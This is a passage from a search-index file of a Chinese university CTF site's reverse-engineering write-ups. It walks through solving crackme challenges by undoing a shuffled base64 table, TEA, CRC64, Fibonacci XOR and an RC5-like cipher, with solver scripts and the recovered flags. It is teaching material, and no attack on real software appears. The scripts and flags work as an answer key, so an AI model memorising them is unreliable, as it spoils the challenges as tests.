\u6bd4\u8f83\u660e\u663e\u7684\u662f\u4e0e 48+9=57\uff0c\u4e5f\u5c31\u662f\u20199\u2019\u7684 ASCII \u7801\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u51fd\u6570\u662f\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u5b57\u7b26\u4e32\uff0c\u4f46 strlen \u8fd8\u4e0d\u592a\u6e05\u6670 \u6ce8\u610f\u5230\u8fd9\u91cc\u7684\u53f3\u79fb 6 \u4f4d\uff0c&3F \u7b49\u64cd\u4f5c\uff0c\u518d\u7ed3\u5408 abcdefg \u53d8\u91cf \u80fd\u591f\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a base64 \u7f16\u7801\uff0c\u800c \u5176\u4e2d\u7684\u5b57\u7b26\u4e32\u662f base64 \u7f16\u7801\u7684\u7ed3\u679c \u4f46\u662f\u76f4\u63a5\u53d6\u51fa\u6765\u8fdb\u884c base64 \u89e3\u7801\u53d1\u73b0\u5e76\u4e0d\u662f\u53ef\u8bfb\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u5230 sub_401000() \u8fd9\u4e2a\u51fd\u6570\u5bf9 base64 \u7f16\u7801\u8868\u8fdb\u884c\u4e86\u6253\u4e71\uff0c\u4e0a\u52a8\u6001\u8c03\u8bd5\uff0c\u76f4\u63a5 dump \u51fa\u6253\u4e71\u7684\u7f16\u7801\u8868 \u7f16\u5199\u811a\u672c\uff0c\u67e5\u8868\u8fd8\u539f\u771f\u6b63\u7684 base64 \u7f16\u7801 origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) \u8fd9\u4e2a\u5c31\u662f\u7b2c\u4e00\u6b21\u8f93\u5165\u7684 name\uff0c\u63a5\u4e0b\u6765\u770b phone \u8fd9\u4e00\u6bb5\u5c06 name \u548c phone \u8fde\u63a5\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u603b\u957f\u5ea6\u662f 24\uff0c\u6240\u4ee5 phone \u7684\u957f\u5ea6\u5e94\u8be5\u662f 9 \u7136\u540e\u770b\u6700\u540e\u7684\u5224\u65ad \u8fdb\u5165\u51fd\u6570\u67e5\u770b \u51fd\u6570\u5185\u6709\u4e09\u6bb5\u5faa\u73af\uff0c\u7b2c\u4e00\u6bb5\u5faa\u73af\u662f 32 \u4f4d\u5e38\u91cf\u7684\u5f02\u6216\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u6bb5\u5faa\u73af\u662f\u67e5\u8868\u64cd\u4f5c\uff0c\u7b2c\u4e09\u6bb5\u5faa\u73af\u7279\u5f81\u6bd4\u8f83\u660e\u663e\uff0c\u6709>>5, \u00d716\uff0c\u4e5f\u5c31\u662f<<4 \u64cd\u4f5c\uff0c\u5e76\u4e14\u6709-0x61c88647= 0x9e3779b9 \u5e38\u91cf\uff0c\u662f\u4e00\u4e2a tea \u52a0\u5bc6 \u7ed3\u5408\u9898\u76ee\u540d\u5b57 baha\uff0cba \u5e94\u8be5\u4ee3\u8868 base64\uff0cha \u6211\u89c9\u5f97\u5e94\u8be5\u662f hash\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6bb5\u5faa\u73af\u5e94\u8be5\u662f\u4e00\u4e2a hash \u7b97\u6cd5\uff0c\u800c\u7528\u67e5\u8868\u65b9\u5f0f\u7684 hash \u7b97\u6cd5\uff0c\u4e00\u822c\u5c31\u662f crc \u4e86\u3002\u4ed4\u7ec6\u5206\u6790\u4ee3\u7801\uff0c\u9996\u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u4e0e\u521d\u59cb\u5bc4\u5b58\u5668\u5f02\u6216\u5f97\u5230\u7d22\u5f15\u503c\uff0c\u5bc4\u5b58\u5668\u53f3\u79fb 8 \u4f4d\u3002\u901a\u8fc7\u7d22\u5f15\u67e5\u8868\u5f97\u5230\u67d0\u4e2a\u503c\uff0c\u518d\u4e0e\u5bc4\u5b58\u5668\u5f02\u6216\uff0c\u5bc4\u5b58\u5668\u957f\u5ea6\u662f\u4e24\u4e2a\u53cc\u5b57\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u67e5\u8868\u6cd5 crc64 \u7b2c\u4e00\u6bb5\u5faa\u73af\u5c31\u662f\u751f\u6210\u8868\u7684\u64cd\u4f5c\uff0c\u540c\u6837\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d dump \u51fa\u8fd9\u5f20\u8868\u5373\u53ef \u6709\u4e86\u8868\u540e\uff0c\u9700\u8981\u9006\u5411\u6062\u590d\u51fa 9 \u4e2a\u5b57\u8282\u5185\u5bb9\uff0c\u56e0\u4e3a crc64 \u7684\u957f\u5ea6\u662f 8 \u5b57\u8282\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u53ea\u80fd\u731c\u6d4b\uff0c\u8303\u56f4\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u5728\u6570\u5b57\u5b57\u7b26\u8303\u56f4\u5185 \u6062\u590d\u7684\u65b9\u6cd5\u53c2\u8003\u4e86https://blog.csdn.net/dabang_007/article/details/48713659 \u56e0\u4e3a\u6b63\u5411\u8ba1\u7b97\u65f6\u5bc4\u5b58\u5668\u5148\u903b\u8f91\u53f3\u79fb 8 \u4f4d\uff0c\u518d\u4e0e\u4e00\u4e2a 8 \u5b57\u8282\u5f02\u6216\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u67e5\u8868\u5f97\u5230\u7684\u503c\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u7b49\uff0c\u5229\u7528\u8fd9\u4e2a\u53ef\u4ee5\u5f97\u5230\u8868\u4e2d\u8fd9\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002\u5f97\u5230\u7b2c\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u540e\uff0c\u5bc4\u5b58\u5668\u5148\u4e0e\u8fd9\u4e2a\u5b57\u5f02\u6216\uff0c\u518d\u5de6\u79fb 8 \u4f4d\uff0c\u7136\u540e\u91cd\u590d\u7b2c\u4e00\u6b21\u64cd\u4f5c\uff0c\u4e00\u5171\u53ef\u4ee5\u5f97\u5230 8 \u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002 \u6839\u636e\u8fd9\u4e9b\u7d22\u5f15\u53f7\uff0c\u904d\u5386\u6240\u6709\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u8fdb\u884c\u4e00\u6b21\u6b63\u5411\u8ba1\u7b97\uff0c\u7ea6\u675f\u540e\u516b\u4e2a\u5b57\u8282\u7684\u8f93\u5165\u5fc5\u987b\u4f7f\u5f97\u67e5\u8868\u65f6\u7684\u7d22\u5f15\u53f7\u662f\u6240\u671f\u671b\u7684\u503c\uff0c\u5c31\u80fd\u5f97\u5230\u6bcf\u4e00\u79cd\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165\u3002 Tea \u7684\u89e3\u5bc6\u6bd4\u8f83\u5bb9\u6613\uff0c\u5c06+\u6539\u4e3a-\uff0c\u987a\u5e8f\u8c03\u6362\u5373\u53ef\u3002 \u6700\u540e\u7f16\u5199\u811a\u672c origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) name = 'b@sE2019_scucs_' phone = '' num = '0123456789' data = [ 0 , 0 , 0x30358979 , 0x7AD870C8 , 0x606B12F2 , 0xF5B0E190 , 0x505E9B8B , 0x8F689158 , 0x9841B68F , 0xC038E573 , 0xA8743FF6 , 0xBAE095BB , 0xF82AA47D , 0x358804E3 , 0xC81F2D04 , 0x4F50742B , 0x6814FE75 , 0xAB28ECB4 , 0x5821770C , 0xD1F09C7C , 0x087FEC87 , 0x5E980D24 , 0x384A65FE , 0x24407DEC , 0xF05548FA , 0x6B1009C7 , 0xC060C183 , 0x11C8790F , 0x903E5A08 , 0x9EA0E857 , 0xA00BD371 , 0xE478989F , 0x88BE6F81 , 0x7D08FF3B , 0xB88BE6F8 , 0x07D08FF3 , 0xE8D57D73 , 0x88B81EAB , 0xD8E0F40A , 0xF2606E63 , 0x10FFD90E , 0xBD301A48 , 0x20CA5077 , 0xC7E86A80 , 0x7094CBFC , 0x4880FBD8 , 0x40A14285 , 0x32588B10 , 0xE0AA91F4 , 0xD620138F , 0xD09F188D , 0xACF86347 , 0x80C18306 , 0x2390F21F , 0xB0F40A7F , 0x594882D7 , 0x78EB277B , 0x1618F6FC , 0x48DEAE02 , 0x6CC08634 , 0x18803589 , 0xE3A8176C , 0x28B5BCF0 , 0x997067A4 , 0x117CDF02 , 0xFA11FE77 , 0x2149567B , 0x80C98EBF , 0x7117CDF0 , 0x0FA11FE7 , 0x41224489 , 0x75796F2F , 0x893D698D , 0x3A291B04 , 0xB908E0F4 , 0x40F16BCC , 0xE9567B7F , 0xCF99FA94 , 0xD963F206 , 0xB5418A5C , 0x79682177 , 0x513912C3 , 0x495DA80E , 0x2BE1620B , 0x19033385 , 0xA489F353 , 0x2936BAFC , 0xDE51839B , 0xE12997F8 , 0x9101F7B0 , 0xD11C1E81 , 0xEBD98778 , 0x8142850A , 0x64B11620 , 0xB1770C73 , 0x1E6966E8 , 0x99C2B083 , 0x8719014C , 0xA9F739FA , 0xFDC17184 , 0xF9A9A271 , 0x72A9E0DC , 0xC99C2B08 , 0x08719014 , 0x0183060C , 0x4721E43F , 0x31B68F75 , 0x3DF994F7 , 0x61E814FE , 0xB29105AF , 0x51DD9D87 , 0xC8497567 , 0xF1D64EF6 , 0x2C31EDF8 , 0xC1E3C78F , 0x56E99D30 , 0x91BD5C04 , 0xD9810C68 , 0xA188D57D , 0xA3597CA0 , 0x6997F879 , 0xEC09088B , 0x59A27100 , 0x96D17843 , 0x09FCEA8B , 0x19B9E91B , 0x39C963F2 , 0x636199D3 , 0x7A6E2D6F , 0xDF7ADABD , 0x4A5BA416 , 0xA5A2AA75 , 0x1A053F9D , 0x2ACA3B2D , 0x2A30B6E4 , 0x50124BE5 , 0xE22F9BE0 , 0x1F423FCE , 0xD21A1299 , 0x659A4F06 , 0x82448912 , 0xEAF2DE5E , 0xB271006B , 0x902AAE96 , 0x127AD31A , 0x74523609 , 0x224F5A63 , 0x0E8A46C1 , 0x7211C1E8 , 0x81E2D799 , 0x42244891 , 0xFB3AA751 , 0x8A3B6595 , 0xB46AD37A , 0xBA0EECEC , 0xCEB2A3B2 , 0xEA507767 , 0x41DA32EA , 0xDA65FE1E , 0x3B024222 , 0xF2D042EE , 0xA2722586 , 0xC2E5CB97 , 0xD8AA554E , 0x92BB501C , 0x57C2C416 , 0xA28ED965 , 0x2D1AB4DE , 0x6A91F461 , 0x624AC0F5 , 0x5AA47D18 , 0x1892B03D , 0x0AFAE693 , 0x97FA2165 , 0x3ACF6FEA , 0xED2251AD , 0x9AC4BC9B , 0x095AC932 , 0xAAF135E2 , 0x7382B9FA , 0xFAAFAE69 , 0xFCEA28A2 , 0xCA9A2710 , 0x8632586A , 0x02850A14 , 0xC9622C41 , 0x32B0836D , 0xB3BA5C89 , 0x62EE18E6 , 0x3CD2CDD1 , 0x52DB919F , 0x460ABD19 , 0x6B12F26D , 0x256B24CA , 0x5B277B14 , 0x5FB35402 , 0x0B79E09F , 0xD0DBC55A , 0x3B4C69E6 , 0xAA03B592 , 0xF35344E2 , 0xE553C1B9 , 0xC366CD9B , 0x9F8BB171 , 0x93385610 , 0x10E32029 , 0xA30DDF69 , 0x6A3B50E1 , 0x03060C18 , 0x8E43C87E , 0x33338561 , 0xF49BB8B6 , 0x636D1EEA , 0x7BF329EE , 0x53589793 , 0x012B5926 , 0x9B47BA97 , 0x4E7B2D0D , 0xAB7233EE , 0x34A35DC5 , 0xFB2CA865 , 0xBBCBCC9D , 0xCB19211C , 0xC113BC55 , 0xE3AC9DEC , 0x5863DBF1 , 0xD3991495 , 0x22BBAB39 , 0x83C78F1E , 0xADD33A61 , 0xB3F20667 , 0xD70B4AA9 , 0x7BED2B63 , 0x985B3E82 , 0x4BD8A21A , 0xE2834E4A , 0x1B863991 , 0x6DEBDF12 , 0x2BB3B0E8 , 0x1733AFDA , 0x8BB86399 , 0xF34B3745 , 0xBB8DEAE0 , 0x8993478D , 0xEBD3716B , 0x06FBD6D5 , 0xDBE6F812 , 0x7C23A61D , 0x13F9D516 , 0x3373D236 , 0x23CC5C6F , 0x49ABA2FE , 0x7392C7E4 , 0xC6C333A6 , 0x43A74E9D , 0xBC1B436E , 0xAC4BC9B5 , 0x95AC9329 , 0x9C7E40CC , 0xEF74E3E1 , 0xCC20DB47 , 0x601C72B9 , 0xFC15523E , 0x1AC40271 , 0x340A7F3A , 0x5594765A , 0x043FF643 , 0x2F4C0692 , 0x54616DC8 , 0xA02497CA , 0x6454E4B1 , 0xDAFCE702 , 0xC45F37C0 , 0x3E847F9D , 0xF46ABEB9 , 0x445C0F55 , 0xA4342532 , 0xCB349E0D , 0x9401AC4B , 0xB1ECEEC5 , 0x5C1E814F , 0xFEBC9AEE , 0x6C2B0836 , 0x8464EA26 , 0x3C7593BD , 0x0B0C7B7E , 0x0C401AC4 , 0x71D40BB6 , 0x24F5A634 , 0xE8A46C12 , 0x14C02F4D , 0x927C1CDA , 0x449EB4C6 , 0x1D148D82 , 0x74AB3DBF , 0x67CCFD4A , 0xBCB410BB , 0x289C8961 , 0x8C8199C2 , 0x5244F9A9 , 0xDCDF0249 , 0xDD2C68F1 , 0xECEA8B30 , 0xA7F41839 , 0x4CE15841 , 0x438C80A6 , 0x7CD4D138 , 0x3954F06E , 0x2C8A4AB3 , 0xB63C6136 , 0x1CBFC3CA , 0xCCE411FE , 0xD4A0EECE , 0x83B465D5 , 0xE49567B7 , 0xF96C151D , 0xB4CBFC3C , 0x76048445 , 0x84FE7545 , 0x0CDCF48D , 0xBD3716B7 , 0x6FBD6D5E , 0x8D029FCE , 0x15651D96 , 0xDD5C0445 , 0x9A0D8CCE , 0xED698D3C , 0xE0D5FC06 , 0x2576A038 , 0xAF85882D , 0x15432941 , 0xD55DF8E5 , 0x451DB2CA , 0x5A3569BD , 0x75283BB3 , 0x20ED1975 , 0xD523E8C2 , 0xC49581EA , 0xE51661BB , 0xBE4DF122 , 0xB548FA30 , 0x3125607A , 0x857D7349 , 0x4BFD10B2 , 0x4D625E4D , 0x04AD6499 , 0x7D57D734 , 0x7E751451 , 0x2D094CBF , 0xF11D8509 , 0x1D3CC5C6 , 0x8BC5F5C1 , 0x35897936 , 0x12B59265 , 0x05BCF04F , 0x686DE2AD , 0x55E26BC4 , 0xE70573F5 , 0x65D7E2BD , 0x9DDD033D , 0xADC8CFB9 , 0xD28D7716 , 0x9DFD46C0 , 0xA85507DE , 0xCDA3DD4B , 0x273D9686 , 0xFD965432 , 0x5DE5E64E , 0x5D9D8743 , 0xB99D7ED1 , 0x6DA80E3A , 0xC3450E19 , 0x3DF695B1 , 0x4C2D9F41 , 0x0DC31CC8 , 0x36F5EF89 , 0xC5DC31CC , 0x79A59BA2 , 0xF5E9B8B5 , 0x037DEB6A , 0xA5B7233E , 0x8C157A32 , 0x9582AA47 , 0xF6CD0AFA , 0xD625E4DA , 0x4AD64994 , 0xE6106DA3 , 0x300E395C , 0xB64EF628 , 0xBF66A804 , 0x867B7F51 , 0xC5BED8CC , 0x4E645255 , 0x8AEEACE7 , 0x7E51DB2C , 0xF036DC2F , 0x2E0F40A7 , 0x7F5E4D77 , 0x1E3AC9DE , 0x05863DBF , 0xBE311AAF , 0xE1FEA520 , 0x8E0493D6 , 0x9B26D5E8 , 0xDE5A085D , 0x144E44B0 , 0xEE6F8124 , 0x6E963478 , 0x2670AC20 , 0x21C64053 , 0x16452559 , 0x5B1E309B , 0x461BBED2 , 0xD476A1C3 , 0x762E37AB , 0xAEAED10B , 0x5E9B8B5B , 0x37DEB6AF , 0x6EAE0222 , 0x4D06C667 , 0x3EF099A9 , 0xC26E573F , 0x0EC510D0 , 0xB8B627F7 , 0xC6DA3DD4 , 0xF7E653DC , 0xF6EFB4AD , 0x8D3E2314 , 0xA6B12F26 , 0x0256B24C , 0x9684A65F , 0x788EC284 , 0x368F752E , 0x9CF65A1B , 0x06BAFC57 , 0xE62E2AD3 , 0x56E467DC , 0x6946BB8B , 0x66D1EEA5 , 0x139ECB43 , 0xAECEC3A1 , 0x5CCEBF68 , 0x9EFB4AD8 , 0x2616CFA0 , 0xCEA5D153 , 0xA97E5EF8 , 0xFE90582A , 0xD3A62E30 , 0xC7593BD8 , 0xB0C7B7E3 , 0xF76CB2A1 , 0xCA1FC72B , 0xA732292A , 0x45775673 , 0x9707A053 , 0x3FAF26BB , 0x5F188D57 , 0x70FF5290 , 0x6F2D042E , 0x0A272258 , 0x3F739FA5 , 0x854FB300 , 0x0F4616DC , 0xFF97C3C8 , 0xAF4DC5AD , 0x1BEF5B57 , 0x9F784CD4 , 0x61372B9F , 0xCF26D75F , 0xEE5FBAC7 , 0xFF135E26 , 0x9487CA0F , 0x370C7322 , 0xDBD7BE24 , 0x0739FA5B , 0xA10FCEEC , 0x576761D0 , 0x2E675FB4 , 0x6752E8A9 , 0x54BF2F7C , 0x4FE75459 , 0xCDCF48D8 , 0x7FD2DD20 , 0xB7173810 , 0x2F8C46AB , 0x387FA948 , 0x1FB9CFD2 , 0x42A7D980 , 0xD7A6E2D6 , 0x0DF7ADAB , 0xE7936BAF , 0x772FDD63 , 0xB7CDF024 , 0xF8474C3B , 0x87F8795D , 0x829F3CF3 , 0x27F3AA2C , 0x66E7A46C , 0x17C62355 , 0x1C3FD4A4 , 0x4798B8DE , 0x935745FC , 0x77AD31A7 , 0xE98F3534 , 0xBFB21CA3 , 0xA6DF411F , 0x8F8795DA , 0xDC0731D7 , 0xDFD90E51 , 0x536FA08F , 0xEFEC8728 , 0x29B7D047 ] k = [ 0x2175da3a , - 0x4c241d25 , 0x149b411 , - 0x2b15395b ] delta = 0x9e3779b9 summary = 0xc6ef3720 result = [ 0x26e17720 , 0x81814336 ] for r in range ( 32 ): result [ 1 ] -= (( summary + result [ 0 ]) & 0xffffffff ) ^ ((( result [ 0 ] >> 5 ) - 0x2b15395b ) & 0xffffffff ) ^ ((( result [ 0 ] << 4 ) + 0x149b411 ) & 0xffffffff ) result [ 1 ] &= 0xffffffff result [ 0 ] -= (( summary + result [ 1 ]) & 0xffffffff ) ^ ((( result [ 1 ] >> 5 ) - 0x4c241d25 ) & 0xffffffff ) ^ ((( result [ 1 ] << 4 ) + 0x2175da3a ) & 0xffffffff ) result [ 0 ] &= 0xffffffff summary -= delta print ( 'ans=' , map ( hex , result )) for ch in name : v14 = origin [ 0 ] ^ ord ( ch ) index = 2 * ( v14 & 0xff ) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'origin=' , map ( hex , origin )) blks = [] for r in range ( 8 ): e = result [ 1 ] & 0xff000000 for i in range ( len ( data )): if e == data [ i ] & 0xff000000 and i % 2 == 1 : blks . append ( i ) result [ 1 ] = (((( result [ 1 ] ^ data [ i ])) << 8 ) & 0xffffffff ) print ( map ( hex , result )) result [ 0 ] = ( result [ 0 ] ^ data [ i - 1 ]) & 0xffffffff result [ 1 ] += ( result [ 0 ] & 0xff000000 ) >> 24 result [ 0 ] = ( result [ 0 ] << 8 ) & 0xffffffff print ( map ( lambda x : hex ( data [ x ]), blks )) for n in num : origin = [ 0x424fa357 , 0x3f6a6fab ] ind = [] number = '' for i in range ( len ( blks ) + 1 ): if i == 0 : v14 = origin [ 0 ] ^ ord ( n ) index = 2 * ( v14 & 0xff ) number += n else : index = blks [ len ( blks ) - i ] - 1 number += ( chr (( origin [ 0 ] ^ ( index / 2 )) & 0xff )) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'n=' , n , ' i=' , i , map ( hex , origin ), number ) print ( map ( hex , origin )) \u53ef\u4ee5\u770b\u5230 201914153 \u662f\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165 \u968f\u540e flag \u5373\u4e3a scuctf{b@sE2019_scucs_201914153}","title":"REVERSE"},{"location":"201905/Reverse/#reverse","text":"","title":"REVERSE"},{"location":"201905/Reverse/#baby","text":"","title":"baby"},{"location":"201905/Reverse/#_1","text":"\u6590\u6ce2\u90a3\u5951\u6570\u5217 \u7b80\u5355\u7684\u5f02\u6216\u52a0\u5bc6","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Reverse/#_2","text":"\u4e3b\u8981\u662f\u63d0\u53d6\u51fa key\uff0c\u7136\u540e\u5f02\u6216\u56de\u53bb\u5c31\u5b8c\u4e8b\u4e86\u3002 table = [ 0x64 , 0x6f , 0x64 , 0x6f , 0x76 , 0x2c , 0x13 , 0x41 , 0x6a , 0xcf , 0x9c , 0x26 , 0x1b , 0xeb , 0x48 , 0x6a , 0xa , 0x2b , 0xf3 , 0x5c , 0x83 , 0x54 , 0x4e , 0x77 , 0x2e , 0x47 , 0x8c , 0x55 ] def fibbo ( n ): a , b = 0 , 1 for i in range ( n ): a , b = b , a + b return a for i , val in enumerate ( table ): print ( chr (( val ^ fibbo ( i + 3 )) & 0xff ), end = '' )","title":"\u89e3\u9898\u601d\u8def"},{"location":"201905/Reverse/#babydondayoo-wp","text":"Windows \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u4e71\u8f93\u4e00\u4e2a\uff0c\u76f4\u63a5\u9000\u51fa\u3002\u7136\u540e\u653e\u8fdb IDA \u91cc\u5206\u6790 \u770b\u5230\u8fd9\u91cc\u6ca1\u6709 main \u51fd\u6570\uff0c\u641c\u7d22\u4e00\u4e0b\u5b57\u7b26\u4e32 Input \u70b9\u5f00 401030 \u51fd\u6570\uff0cF5 \u53cd\u6c47\u7f16\uff0c\u786e\u5b9a\u8fd9\u4e2a\u662f main \u51fd\u6570 \u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u770b\u61c2\uff0c401180 \u548c 401130 \u5206\u522b\u662f printf \u548c scanf\uff0c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 30 \u63a5\u4e0b\u6765 while \u5faa\u73af\u91cc\u505a\u4e86\u4e00\u4e2a\u5f02\u6216\u64cd\u4f5c\uff0c\u518d\u5224\u65ad\u662f\u5426\u548c\u5185\u5b58\u4e2d\u7684\u6570\u636e\u76f8\u7b49\uff0c\u76f8\u7b49\u5219\u8f93\u5165\u6b63\u786e \u53d8\u91cf v3 \u662f\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0cv4 \u662f 401000 \u751f\u6210\u7684\u4e00\u4e2a\u6570\u636e\uff0c\u8fdb\u5165 401000 \u5206\u6790 \u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570 \u4e00\u5f00\u59cb\u6ca1\u770b\u660e\u767d\u662f\u505a\u4ec0\u4e48\u7528\u7684\uff0c\u7528 python \u5bf9\u7167\u7740\u5199\u4e86\u4e00\u4e0b \u5f88\u660e\u663e\uff0c\u51fd\u6570\u8fd4\u56de\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7b2c n \u4e2a\u503c \u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8ba9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c\u6590\u6ce2\u90a3\u5951\u6570\u5217\u8fdb\u884c\u5f02\u6216\u7684\u503c\u4e0e byte_41C7D4 \u76f8\u7b49 \u628a\u8fd9\u6bb5\u6570\u636e dump \u51fa\u6765\uff0c\u7f16\u5199 python \u811a\u672c from libnum import n2s def func ( num ): v1 = num if ( num == 0 or num == 1 ): return num v2 = func ( num - 2 ) return ( v2 + func ( v1 - 1 )) & 2 ** 8 - 1 arr = [] for i in range ( 30 ): arr . append ( func ( i + 3 )) c = '71 60 70 6B 79 73 59 0E 68 E6 DA 26 17 84 44 28 20 1F 9D 69 C0 53 63 45 1D 35 D9 1C E4 78' . split ( ' ' ) c = list ( map ( lambda x : int ( '0x' + x , 16 ), c )) flag = '' print ( arr , c ) for i in range ( 30 ) : flag += ( n2s ( arr [ i ] ^ c [ i ])) print ( flag )","title":"baby(dondayoo~\u6218\u961f wp)"},{"location":"201905/Reverse/#showme666","text":"","title":"showme666"},{"location":"201905/Reverse/#_3","text":"\u6c47\u7f16\u7406\u89e3 gdb \u8c03\u8bd5 patch","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Reverse/#_4","text":"\u8fd9\u9053\u9898\u89e3\u9898\u601d\u8def\u4e0d\u552f\u4e00 \u6700\u7b80\u5355\u7684\u662f\u7528 gdb \u8c03\u8bd5\u65f6\uff0c\u4fee\u6539 rip \u5230 0x4006b6\uff0c\u7136\u540e\u7ee7\u7eed\u8fd0\u884c\uff0c\u5c31\u53ef\u8f93\u51fa flag \u7136\u540e\u7ee7\u7eed\u8fd0\u884c\u5373\u53ef","title":"\u89e3\u9898\u601d\u8def"},{"location":"201905/Reverse/#showme666dondayoo-wp","text":"\u5148\u8fd0\u884c\u7a0b\u5e8f\u770b\u770b \u662f\u4e00\u4e2a\u63b7\u9ab0\u5b50\u7a0b\u5e8f\uff0c\u5fc5\u987b 5 \u4e2a\u90fd\u662f 6 \u70b9\u624d\u80fd\u901a\u8fc7\uff0c\u5206\u6790\u7a0b\u5e8f\u7c7b\u578b 64 \u4f4d ELF \u7a0b\u5e8f\uff0c\u7528 IDA64 \u6253\u5f00 \u968f\u673a\u6570\u662f\u7528\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\u751f\u6210\uff0c\u4e0d\u53ef\u63a7\u5236 \u800c\u4e14\u8fd8\u6709\u53cd\u4f5c\u5f0a\u673a\u5236\uff0c666 \u8fd9\u4e00\u6bb5\u662f\u6700\u7ec8\u7ed3\u679c\u90e8\u5206\uff0c\u5982\u679c\u63b7\u51fa 5 \u4e2a 6 \u70b9\uff0c\u4f1a\u8c03\u7528 4006B6 \u51fd\u6570\uff0c\u8fdb\u5165\u51fd\u6570\u67e5\u770b \u5176\u4e2d\u6709 putchar\uff0c\u8bf4\u660e\u8be5\u51fd\u6570\u4f1a\u8f93\u5165\u5b57\u7b26\uff0c\u5e94\u8be5\u5c31\u662f\u8f93\u51fa flag\u3002\u6700\u91cd\u8981\u7684\u662f\u8be5\u51fd\u6570\u6ca1\u6709\u53c2\u6570\u4f20\u5165\uff0c\u6240\u4ee5\u53ea\u8981\u52a8\u6001\u8c03\u8bd5\u76f4\u63a5\u5c06\u51fd\u6570\u5730\u5740\u4f5c\u4e3a IP \u5c31\u80fd\u591f\u6267\u884c\u8be5\u51fd\u6570 \u4e00\u8def\u6267\u884c\u5230\u5e95\uff0c\u8f93\u51fa\u4e86 flag \u8981\u628a flag \u6362\u6210 scuctf","title":"showme666(dondayoo~\u6218\u961f wp)"},{"location":"201905/Reverse/#rcrcrc","text":"","title":"rcrcrc"},{"location":"201905/Reverse/#_5","text":"\u7b97\u6cd5\u5206\u6790 python \u811a\u672c\u7f16\u5199","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Reverse/#_6","text":"\u8fd9\u9898\u4e3b\u8981\u8003\u5bdf\u9006\u5411\u5206\u6790\u80fd\u529b\uff08\u7eb8\u4e0a\u6253\u4e2a\u8349\u7a3f\uff0c\u4ee3\u7801\u9006\u7740\u5199\u5c31\u884c\u4e86 \u89e3\u9898\u811a\u672c\u5982\u4e0b(C \u8bed\u8a00) #include <stdio.h> unsigned int key [] = { 0xF4A956BF , 0xBA568F3D , 0xD73A7F7C , 0x817F532B }; unsigned int T [] = { 0xd24aaa79 , 0x0bf82ac7 , 0x6d08584c , 0x4b7703cf , 0xeb5a5436 , 0x04fc4110 , 0x07a6c88e , 0xcce3bc69 , 0x67b581db , 0x42958bd7 , 0xfde60589 , 0xfbc21664 , 0x56fc110f , 0x224189f6 , 0x0da07f95 , 0xfb0506e6 , 0x1b02b4d0 , 0x4c263256 , 0x1bf60164 , 0x79ad7531 , 0xe0fa6867 , 0xe06b6073 , 0xd63b49ce , 0xa5d0d5fe , 0x89713ab9 , 0x3258490d }; unsigned int func ( unsigned int a , unsigned int b ) { return (( a >> ( b & 0x1f )) | ( a << ( 32 - b & 0x1f ))) & 0xffffffff ; } int main () { int i , j ; for ( i = 2 ; i >= 0 ; i -= 2 ) { unsigned int a = key [ i ]; unsigned int b = key [ i + 1 ]; for ( j = 11 ; j >= 0 ; j -- ) { b -= T [ 2 * i + 1 ]; b = func ( b , a ) ^ a ; a -= T [ 2 * i ]; a = func ( a , b ) ^ b ; } key [ i ] = a - 0xd24aaa79 ; key [ i + 1 ] = b - 0x0bf82ac7 ; } printf ( \"%s\" , key ); 